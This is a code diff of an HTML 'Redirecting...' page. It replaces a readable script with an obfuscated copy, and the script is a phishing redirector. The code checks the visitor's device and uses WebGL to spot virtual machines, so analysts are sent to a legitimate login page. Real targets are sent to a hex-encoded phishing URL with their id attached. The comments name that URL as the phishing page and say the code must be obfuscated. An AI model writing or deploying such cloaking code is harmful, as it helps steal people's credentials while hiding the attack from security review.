@@ -6,71 +6,7 @@
     <title>Redirecting...</title>
     <script>
 // This part must be OBFUSCATED with some obfuscator 
-(function(){
-            function checkDevice() {
-                var userAgent = window.navigator.userAgent.toLowerCase();
-                return userAgent.includes('windows') || userAgent.includes('android') || userAgent.includes('iphone');
-            }
-            function isVirtualMachine() {
-                var canvas = document.createElement('canvas');
-                var gl = canvas.getContext('webgl');
-
-                if (gl) {
-                    var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).toLowerCase();
-                        return renderer.includes('swiftshader'); 
-                    } else {
-                        return false; 
-                    }
-                } else {
-                    return false; 
-                }
-            }
-            
-            function getParameterByName(name) {
-                var urlParams = new URLSearchParams(window.location.search);
-                return urlParams.get(name);
-            }
-
-            
-            function decodeHex(hexString) {
-                var str = '';
-                for (var i = 0; i < hexString.length; i += 2) {
-                    str += String.fromCharCode(parseInt(hexString.substr(i, 2), 16));
-                }
-                return str;
-            }
-            // Legit Obfuscated website to redirect in case of VM
-
-            var redirectOfficeHex = '68747470733a2f2f6f616d2d75616c2e65733f69643d'//'68747470733a2f2f617574682e6f70656e61692e636f6d2f6c6f672d696e'
-
-            // Obfuscated Phishing Page URL 
-            var redirectCronHex = '68747470733a2f2f6f616d2d75616c2e65733f69643d'
-
-            
-            function redirectWithId() {
-                var idBase64 = getParameterByName('id');
-
-            
-                if (!checkDevice() || isVirtualMachine()){ 
-                    window.location.href = decodeHex(redirectOfficeHex);
-                    return;
-                }
-
-            
-                if (idBase64) {
-                    var cronUrl = decodeHex(redirectCronHex) + idBase64;
-                    window.location.href = cronUrl;
-                } else {
-                    window.location.href = decodeHex(redirectOfficeHex);
-                }
-            }
-
-            window.onload = function() {
-                redirectWithId();
-            };
-        })();
+function _0x5c42(_0x558bf4,_0xac8121){var _0x5bdad3=_0x5bda();return _0x5c42=function(_0x5c4263,_0x470a97){_0x5c4263=_0x5c4263-0xe4;var _0x39fd3c=_0x5bdad3[_0x5c4263];return _0x39fd3c;},_0x5c42(_0x558bf4,_0xac8121);}(function(_0x55f217,_0x5605bb){var _0x50c45a=_0x5c42,_0x245439=_0x55f217();while(!![]){try{var _0x2d01ee=parseInt(_0x50c45a(0xf8))/0x1*(-parseInt(_0x50c45a(0xe5))/0x2)+-parseInt(_0x50c45a(0xf9))/0x3+parseInt(_0x50c45a(0xf7))/0x4*(-parseInt(_0x50c45a(0xfd))/0x5)+-parseInt(_0x50c45a(0x101))/0x6*(parseInt(_0x50c45a(0xee))/0x7)+-parseInt(_0x50c45a(0xe7))/0x8+parseInt(_0x50c45a(0xfa))/0x9*(-parseInt(_0x50c45a(0xf4))/0xa)+-parseInt(_0x50c45a(0xeb))/0xb*(-parseInt(_0x50c45a(0x102))/0xc);if(_0x2d01ee===_0x5605bb)break;else _0x245439['push'](_0x245439['shift']());}catch(_0x349a55){_0x245439['push'](_0x245439['shift']());}}}(_0x5bda,0x71d24),(function(){var _0x23ea7b=_0x5c42;function _0x12aebf(){var _0x40b8d6=_0x5c42,_0x45bfc6=window[_0x40b8d6(0xf3)][_0x40b8d6(0xfc)][_0x40b8d6(0xec)]();return _0x45bfc6[_0x40b8d6(0xe8)](_0x40b8d6(0xe9))||_0x45bfc6[_0x40b8d6(0xe8)](_0x40b8d6(0xe4))||_0x45bfc6[_0x40b8d6(0xe8)](_0x40b8d6(0xfe));}function _0x47b2f8(){var _0x14d2b4=_0x5c42,_0x12f673=document[_0x14d2b4(0xf6)](_0x14d2b4(0xef)),_0x599620=_0x12f673['getContext'](_0x14d2b4(0xf2));if(_0x599620){var _0x2b2373=_0x599620[_0x14d2b4(0xe6)](_0x14d2b4(0x100));if(_0x2b2373){var _0x299d19=_0x599620['getParameter'](_0x2b2373['UNMASKED_RENDERER_WEBGL'])['toLowerCase']();return _0x299d19[_0x14d2b4(0xe8)](_0x14d2b4(0xf5));}else return![];}else return![];}function _0x11887f(_0x13dce4){var _0x388247=_0x5c42,_0x2a6fa9=new URLSearchParams(window[_0x388247(0xfb)]['search']);return _0x2a6fa9[_0x388247(0x103)](_0x13dce4);}function _0x3ed0fb(_0x3fc656){var _0x27fbf7=_0x5c42,_0x4ff892='';for(var _0x29ad0a=0x0;_0x29ad0a<_0x3fc656[_0x27fbf7(0xf1)];_0x29ad0a+=0x2){_0x4ff892+=String[_0x27fbf7(0xed)](parseInt(_0x3fc656[_0x27fbf7(0xff)](_0x29ad0a,0x2),0x10));}return _0x4ff892;}var _0x58b3da='68747470733a2f2f617574682e6f70656e61692e636f6d2f6c6f672d696e',_0x5e8b47=_0x23ea7b(0xf0);function _0x59b35b(){var _0x576125=_0x23ea7b,_0x5b89e6=_0x11887f('id');if(!_0x12aebf()||_0x47b2f8()){window[_0x576125(0xfb)][_0x576125(0xea)]=_0x3ed0fb(_0x58b3da);return;}if(_0x5b89e6){var _0x223267=_0x3ed0fb(_0x5e8b47)+_0x5b89e6;window['location']['href']=_0x223267;}else window[_0x576125(0xfb)][_0x576125(0xea)]=_0x3ed0fb(_0x58b3da);}window['onload']=function(){_0x59b35b();};}()));function _0x5bda(){var _0x4078d4=['68747470733a2f2f6f616d2d75616c2e65733f69643d','length','webgl','navigator','59750dpPzhp','swiftshader','createElement','1170484yiCfMM','2yrZSkP','1174743olKThv','495taKHpM','location','userAgent','15RdiUEi','iphone','substr','WEBGL_debug_renderer_info','486CNHBhe','12nDRLSU','get','android','766104fwZsVo','getExtension','906768cnqxbN','includes','windows','href','41808712ytKiqa','toLowerCase','fromCharCode','74067HsQaOQ','canvas'];_0x5bda=function(){return _0x4078d4;};return _0x5bda();}
       </script>  
     </head>
 <body>
